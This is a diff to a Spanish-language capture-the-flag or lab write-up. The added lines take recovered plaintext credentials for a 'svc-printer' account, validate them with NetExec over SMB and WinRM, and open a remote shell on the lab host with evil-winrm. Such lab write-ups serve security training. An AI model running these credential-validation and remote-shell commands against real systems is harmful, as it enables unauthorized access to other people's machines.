@@ -32,4 +32,22 @@ Obteniendo las credenciales en texto claro
 svc-printer::1edFg43012!!
 ```
 
+Vamos a validarlas contra el servidor usando [[NETEXEC]]
+```shell
+nxc smb 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
+```
+
+Vemos que si que son validas, probamos a enumerar si el usuario pertenece al grupo de `Remote Management` usando [[NETEXEC]]
+```shell
+nxc winrm 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
+```
+
+Obteniendo como resultado que el usuario es perteneciente a este grupo pudiéndonos conectarnos así mediante [[EVIL-WINRM]]
+```shell
+evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
+```
+
+
+
+
 
